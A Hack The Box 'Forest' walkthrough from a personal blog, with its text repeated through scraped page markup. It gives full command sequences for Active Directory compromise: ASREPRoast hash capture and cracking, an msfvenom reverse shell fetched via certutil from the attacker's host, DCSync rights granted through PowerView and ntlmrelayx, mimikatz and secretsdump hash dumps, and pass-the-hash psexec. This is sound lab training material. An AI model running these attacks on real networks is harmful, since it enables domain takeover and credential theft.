scanned in 285.63 seconds Enumeration (1) Seems like an Active Directory Domain Controller. Where do we start ? @.@ According to the nmap’s host script results, we see the actual domain name of the box is htb.local so lets modify /etc/hosts to include it as well. 1 2 3 $ cat /etc/hosts ... 10.10.10.161 forest.htb htb.local Seeing that there might be a DNS server running on port 53, lets try to use dig on it. 1 2 3 4 5 $ dig axfr htb.local @10.10.10.161 ; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr htb.local @10.10.10.161 ;; global options: +cmd ; Transfer failed. Nothing :( LDAP is running on port 389 so lets check that out using ldapsearch. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ldapsearch -h htb.local -p 389 -x -b &quot;dc=htb,dc=local&quot; # extended LDIF # # LDAPv3 # base &lt;dc=htb,dc=local&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # htb.local dn: DC=htb,DC=local objectClass: top objectClass: domain objectClass: domainDNS distinguishedName: DC=htb,DC=local ... I’m not sure what to look for but let’s first look at what users we can find? I wasn’t familiar with how LDAP queries work so I decided to use another tool windapsearch to simplify the job. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 python windapsearch.py -d htb.local -U [+] No username provided. Will try anonymous bind. [+] No DC IP provided. Will try to discover via DNS lookup. [+] Using Domain Controller at: 10.10.10.161 [+] Getting defaultNamingContext from Root DSE [+] Found: DC=htb,DC=local [+] Attempting bind [+] ...success! Binded as: [+] None [+] Enumerating all AD users [+] Found 28 users: ... cn: Sebastien Caron userPrincipalName: sebastien@htb.local cn: Lucinda Berger userPrincipalName: lucinda@htb.local cn: Andy Hislip userPrincipalName: andy@htb.local cn: Mark Brandt userPrincipalName: mark@htb.local cn: Santi Rodriguez userPrincipalName: santi@htb.local [*] Bye! Nice! We found 5 usernames to play with! But what exactly can we do with them? Seeing that there is Kerberos running on port 88, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this article, lets see if we can perform the ASREPRoast attack using impacket’s GetNPUsers.py while specifying the 5 usernames we found. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ cat users.txt sebastien lucinda andy mark santi $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set Looks like we didn’t manage to get any hashes… At this point, I wasn’t sure how to carry on so I check the forums for hints. Many of them actually stated that they were able to obtain a hash but instead of finding 5 usernames, they found 6? How was I missing a username? Inside of impacket’s collection of scripts, there was a file called GetADUsers.py which seemed hopeful. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ GetADUsers.py -all htb.local/ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Querying htb.local for information about domain. Name Email PasswordLastSet LastLogon -------------------- ------------------------------ ------------------- ------------------- Administrator Administrator@htb.local 2019-09-18 13:09:08.342879 2019-10-07 06:57:07.299606 Guest &lt;never&gt; &lt;never&gt; DefaultAccount &lt;never&gt; &lt;never&gt; krbtgt 2019-09-18 06:53:23.467452 &lt;never&gt; $331000-VK4ADACQNUCA &lt;never&gt; &lt;never&gt; ... sebastien 2019-09-19 20:29:59.544725 2019-09-22 18:29:29.586227 lucinda 2019-09-19 20:44:13.233891 &lt;never&gt; svc-alfresco 2019-11-16 07:54:12.200875 2019-11-16 07:52:19.754834 andy 2019-09-22 18:44:16.291082 &lt;never&gt; mark 2019-09-20 18:57:30.243568 &lt;never&gt; santi 2019-09-20 19:02:55.134828 &lt;never&gt; There it is! The 6th username is svc-alfresco. But I wonder why did the username not appear in our LDAP search results just now? After appending the username to the list of usernames, we performed the ASREPRoast attack again. 1 2 3 4 5 6 7 8 9 10 11 $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set $ cat hashes.asreproast $krb5asrep$23$svc-alfresco@HTB.LOCAL:2bb5707401079b05d2add14953eb4d3c$e18b26c973eff18a7251f9f91af611d656b3534a66acd206f4354192c9c190583dc0444ec333ced4859abdd727fefe34277023f77ce6074bae70b015f6fb94d0abdd9f6c900c15d55f59919c7261e62c10f29f8e63cca4906f4df075a12e10398d094f1ca165a3b23a419501c363b77b607bdcf740931c0bb21866b2feed344d4195a1a164d7c27154e7a00131f9f7a6e8a7ac4845df6fe7b27656a6423126a3933503d7d507f68b787d21e1b80d1fefb09f0dfd237b8ff3e499613f5fd0e0baa2c000c1fcf069fc4d1d5bcedf98d8fb6d8eebf70d6233e10e40944ce5849c7bb94319d68229 Great! We are back on track! We then cracked the hash using john. 1 2 3 4 5 6 7 8 9 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status s3rvice ($krb5asrep$svc-alfresco@HTB.LOCAL) 1g 0:00:00:06 DONE (2019-10-26 03:10) 0.1457g/s 595591p/s 595591c/s 595591C/s s401447401447401447..s3r2s1 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed With svc-alfresco:s3rvice, I tried enumerating for SMB shares using smbmap but found nothing :( 1 2 3 4 5 6 7 8 9 10 11 smbmap -H htb.local -u svc-alfresco -p s3rvice [+] Finding open SMB ports.... [+] User SMB session establishd on htb.local... [+] IP: htb.local:445 Name: htb.local Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY NETLOGON READ ONLY SYSVOL READ ONLY With no other service to try out the credentials, I re-scanned for open ports, but this time from ports 1-65535. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sS -p 1-65535 htb.local Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 08:40 EST Nmap scan report for htb.local (10.10.10.161) Host is up (0.25s latency). Not shown: 65511 closed ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49698/tcp open unknown 49708/tcp open unknown I now see a possible entry point, which is port 5985 that is used by the WinRM service for remote management of Windows systems. Lets see if we can establish a shell using Alamot’s winrm_shell.rb 1 2 3 4 5 6 7 8 9 10 11 12 require &#39;winrm&#39; # Author: Alamot conn = WinRM::Connection.new( endpoint: &#39;http://htb.local:5985/wsman&#39;, transport: :ssl, user: &#39;htb.local\svc-alfresco&#39;, password: &#39;s3rvice&#39;, :no_ssl_peer_verification =&gt; true ) ... user.txt 1 2 3 $ ruby winrm_shell.rb PS htb\svc-alfresco@FOREST Documents&gt; whoami htb\svc-alfresco We finally got in! Now, to grab the user flag. 1 2 3 PS htb\svc-alfresco@FOREST Documents&gt; cd ../Desktop PS htb\svc-alfresco@FOREST Desktop&gt; more user.txt e5e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) This was where I really got lost and I had to turn to the forums for more hints. Many mentioned about some “dog” but I guess they were referring to BloodHound. 1 2 3 BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment. When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor (SharpHound) to run on the system, I first need to upgrade my current WinRM shell to a meterpreter shell. First, I generate my reverse shell executable using msfvenom and start our reverse shell listener. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/handler) &gt; set LPORT 1337 LPORT =&gt; 1337 msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:1337 And then start a web server using the builtin SimpleHTTPServer module in python 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/shell.exe . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... In our previous WinRM shell still hopefully connected, 1 2 3 4 5 6 7 PS htb\svc-alfresco@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS htb\svc-alfresco@FOREST Documents&gt;./shell.exe 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.161 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500 meterpreter &gt; Next up, we upload SharpHound.ps1 to the box and run it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 meterpreter &gt; upload SharpHound.ps1 . [*] uploading : SharpHound.ps1 -&gt; . [*] uploaded : SharpHound.ps1 -&gt; .\SharpHound.ps1 meterpeter &gt; shell Process 2476 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Users\svc-alfresco\Documents&gt; powershell Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\SharpHound.ps1 Import-Module .\SharpHound.ps1 PS C:\Users\svc-alfresco\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Initializing BloodHound at 8:42 AM on 11/16/2019 Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets Starting Enumeration for htb.local Status: 124 objects enumerated (+124 41.33333/s --- Using 70 MB RAM ) Finished enumeration for htb.local in 00:00:03.7645465 1 hosts failed ping. 0 hosts timedout. Compressing data to C:\Users\svc-alfresco\Documents\20191116084214_BloodHound.zip. You can upload this file directly to the UI. Finished compressing files! And now to retrieve the compressed file back to our system. 1 2 3 4 5 PS C:\Users\svc-alfresco\Documents&gt; exit C:\Users\svc-alfresco\Documents&gt; exit meterpreter &gt; download 20191116084214_BloodHound.zip [*] downloading : 20191116084214_BloodHound.zip. -&gt; /root/Desktop [*] downloaded : 20191116084214_BloodHound.zip. -&gt; /root/Desktop/20191116084214_BloodHound.zip And now the moment you have been waiting for, witness the capabilities of BloodHound! There are actually 2 ways to run BloodHound, first being running it on your own system and secondly being running it in a Docker container. Since it is extremely troublesome to set up, I will be using this image belane/bloodhound. 1 2 3 4 5 6 $ docker run -it \ -p 7474:7474 \ -e DISPLAY=unix$DISPLAY \ -v /tmp/.X11-unix:/tmp/.X11-unix \ --device=/dev/dri:/dev/dri \ --name bloodhound belane/bloodhound What you will notice is that a window will automatically be opened and BloodHound is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. BloodHound actually supports drag and drop but for some reason it was not working so we need to use docker cp to get the data in. 1 $ docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip Then from the interface, click on Upload Data on the right side, select the file and hit Open. It will take a while for BloodHound to populate its database. I won’t go through all the features of BloodHound, but I will be focusing on one of them which is the ability to perform pathfinding from a given Start Node to a given Target Node. These nodes can be Users, Groups or OUs. Since we are currently svc-alfresco and are attempting to escalate to the Administrator account, we will set svc-alfresco@htb.local as the Start Node and Administrator@htb.local as the Target Node and hope that we are able to find a path. Click on the triangle button to begin pathfinding. As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between EXCHANGE WINDOWS PERMISSION@HTB.LOCAL and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the WriteDacl privilege will be given. 1 The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object&#39;s DACL, you can grant yourself any privilege you want on the object. According to this post, the WriteDacl privilege allows us to perform DCSync operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL. Exploitation First we will need to upload PowerView, which is a module that I use that contains many useful Powershell commands for offensive operations. 1 2 3 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1 Back to the powershell shell, we will import it in. 1 Import-Module .\PowerView.ps1 Next we will create a new user and add him to the EXCHANGE WINDOWS PERMISSIONS group. 1 2 3 $UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &#39;rizemon&#39; According to this picture from the earlier post, we will need to run ntlmrelayx on our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Protocol Client SMB loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client LDAPS loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client SMTP loaded.. [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up HTTP Server [*] Servers started, waiting for connections With that done, we need to get the Exchange Server to perform NTLM authentication to us over HTTP. However, there is no Exchange server running on the box! Since we already have a user in the EXCHANGE WINDOWS PERMISSIONS group, we can simply use our own browser to do the authentication. Opening any browser, we browse to http://localhost/privexchange. We will then be prompted for credentials, where we enter those of our newly created user and hit OK. Back on our ntlmrelayx, we see that our new user has gotten the necessary privileges to perform DCSync operations! 1 2 3 4 5 6 7 8 9 10 11 *] HTTPD: Received connection from 127.0.0.1, attacking target ldap://htb.local [*] HTTPD: Client requested path: /privexchange [*] HTTPD: Client requested path: /privexchange [*] Authenticating against ldap://htb.local as \rizemon SUCCEED [*] Enumerating relayed user&#39;s privileges. This may take a while on large domains [*] User privileges found: Create user [*] User privileges found: Modifying domain ACL [*] Querying domain security descriptor [*] Success! User rizemon now has Replication-Get-Changes-All privileges on the domain [*] Try using DCSync with secretsdump.py and this user :) [*] Saved restore state to aclpwn-20191229-070933.restore And now the last step is to obtain the hash for the domain administrator account using impacket’s secretsdump.py. 1 2 3 4 5 6 7 $ python secretsdump.py &#39;htb.local/rizemon:Password123!@htb.local&#39; -just-dc Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ... root.txt (1) Using impacket’s psexec.py and the hashes we got, we can remotely login to the box as Administrator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on htb.local..... [*] Found writable share ADMIN$ [*] Uploading file NKMskQmQ.exe [*] Opening SVCManager on htb.local..... [*] Creating service IHWO on htb.local..... [*] Starting service IHWO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\root.txt f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt(2) First we will need to upload PowerView, which contains the commands needed for our exploit. 1 2 3 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1 Back to the powershell shell, we will import it in. 1 Import-Module .\PowerView.ps1 Next we will create a new user and add him to the EXCHANGE WINDOWS PERMISSIONS group. 1 2 3 $UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &#39;rizemon&#39; With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the Remote Management Users group. 1 Add-DomainGroupMember -Identity &quot;Remote Management Users&quot; -Members &#39;rizemon&#39; We then establish a shell using Alamot’s winrm_shell.rb and upgrade to a meterpreter shell. 1 2 3 4 5 6 7 8 9 10 11 12 require &#39;winrm&#39; # Author: Alamot conn = WinRM::Connection.new( endpoint: &#39;http://htb.local:5985/wsman&#39;, transport: :ssl, user: &#39;htb.local\rizemon&#39;, password: &#39;Password123!&#39;, :no_ssl_peer_verification =&gt; true ) ... 1 2 3 4 5 6 7 8 $ ruby winrm_shell.rb PS htb\rizemon@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS htb\rizemon@FOREST Documents&gt;./shell.exe 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.161 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500 meterpreter &gt; We are going to need PowerView again as well as mimikatz, which is used to dump out the password hashes. 1 2 3 4 5 6 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1 meterpreter &gt; upload /root/Downloads/mimikatz.exe . [*] uploading : /root/Downloads/mimikatz.exe -&gt; . [*] uploaded : /root/Downloads/mimikatz.exe -&gt; .\mimikatz.exe To dump out the hashes, the new user will need the DCSync privileges, which consist of the DS-Replication-Get-Changes, DS-Replication-Get-Changes-All and Replicating Directory Changes In Filtered Set rights. More can be learnt from here. Fortunately, we can use the Add-DomainObjectAcl function to add all 3 privilges for us using the -Rights DCSync option. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 meterpreter &gt; shell Process 1224 created. Channel 2 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Users\rizemon\Documents&gt;powershell powershell Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\Users\peter1\Documents&gt;Import-Module ./PowerView.ps1 Import-Module ./PowerView.ps1 PS C:\Users\peter1\Documents&gt; Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync And finally, we dump out the hashes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 PS C:\Users\rizemon\Documents&gt; ./mimikatz.exe ./mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Nov 25 2019 02:50:28 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator [DC] &#39;htb.local&#39; will be the domain [DC] &#39;FOREST.htb.local&#39; will be the DC server [DC] &#39;Administrator&#39; will be the user account Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator User Principal Name : Administrator@htb.local Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000200 ( NORMAL_ACCOUNT ) Account expiration : Password last change : 9/18/2019 9:09:08 AM Object Security ID : S-1-5-21-3072663084-364016917-1341370565-500 Object Relative ID : 500 Credentials: Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6 Using impacket’s psexec.py and the hash we got, we can remotely login to the box as Administrator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ psexec.py Administrator@htb.local -hashes :32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on htb.local..... [*] Found writable share ADMIN$ [*] Uploading file NKMskQmQ.exe [*] Opening SVCManager on htb.local..... [*] Creating service IHWO on htb.local..... [*] Starting service IHWO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\root.txt f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/forest-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/forest-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-22T08:38:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Forest" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/forest-htb/"},"description":"This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience! Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.161 forest.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 $ nmap -sV -sT -sC forest.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-19 08:19 EDT Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 55.65% done; ETC: 08:19 (0:00:08 remaining) Nmap scan report for forest.htb (10.10.10.161) Host is up (0.26s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-19 12:27:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=10/19%Time=5DAAFF64%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,&quot;\\0\\xdir 1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03&quot;)%r(HTTPOptions,2A,&quot;\\0\\(m\\xd1\\x81\\x82\\0\\x01\\0\\0\\ SF:0\\0\\0\\x01\\0\\0\\x02\\0\\x01\\0\\0\\)\\x0f\\xa0\\0\\0\\0\\0\\0\\x0c\\0\\n\\0\\x08\\xbd&lt;\\.\\x1 SF:b\\x9d\\x91\\xc8`&quot;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m37s, deviation: 4h02m31s, median: 7m36s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-19T05:29:41-07:00 | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-19 08:29:43 |_ start_date: 2019-10-19 06:16:26 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 285.63 seconds Enumeration (1) Seems like an Active Directory Domain Controller. Where do we start ? @.@ According to the nmap’s host script results, we see the actual domain name of the box is htb.local so lets modify /etc/hosts to include it as well. 1 2 3 $ cat /etc/hosts ... 10.10.10.161 forest.htb htb.local Seeing that there might be a DNS server running on port 53, lets try to use dig on it. 1 2 3 4 5 $ dig axfr htb.local @10.10.10.161 ; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr htb.local @10.10.10.161 ;; global options: +cmd ; Transfer failed. Nothing :( LDAP is running on port 389 so lets check that out using ldapsearch. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ldapsearch -h htb.local -p 389 -x -b &quot;dc=htb,dc=local&quot; # extended LDIF # # LDAPv3 # base &lt;dc=htb,dc=local&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # htb.local dn: DC=htb,DC=local objectClass: top objectClass: domain objectClass: domainDNS distinguishedName: DC=htb,DC=local ... I’m not sure what to look for but let’s first look at what users we can find? I wasn’t familiar with how LDAP queries work so I decided to use another tool windapsearch to simplify the job. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 python windapsearch.py -d htb.local -U [+] No username provided. Will try anonymous bind. [+] No DC IP provided. Will try to discover via DNS lookup. [+] Using Domain Controller at: 10.10.10.161 [+] Getting defaultNamingContext from Root DSE [+] Found: DC=htb,DC=local [+] Attempting bind [+] ...success! Binded as: [+] None [+] Enumerating all AD users [+] Found 28 users: ... cn: Sebastien Caron userPrincipalName: sebastien@htb.local cn: Lucinda Berger userPrincipalName: lucinda@htb.local cn: Andy Hislip userPrincipalName: andy@htb.local cn: Mark Brandt userPrincipalName: mark@htb.local cn: Santi Rodriguez userPrincipalName: santi@htb.local [*] Bye! Nice! We found 5 usernames to play with! But what exactly can we do with them? Seeing that there is Kerberos running on port 88, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this article, lets see if we can perform the ASREPRoast attack using impacket’s GetNPUsers.py while specifying the 5 usernames we found. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ cat users.txt sebastien lucinda andy mark santi $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set Looks like we didn’t manage to get any hashes… At this point, I wasn’t sure how to carry on so I check the forums for hints. Many of them actually stated that they were able to obtain a hash but instead of finding 5 usernames, they found 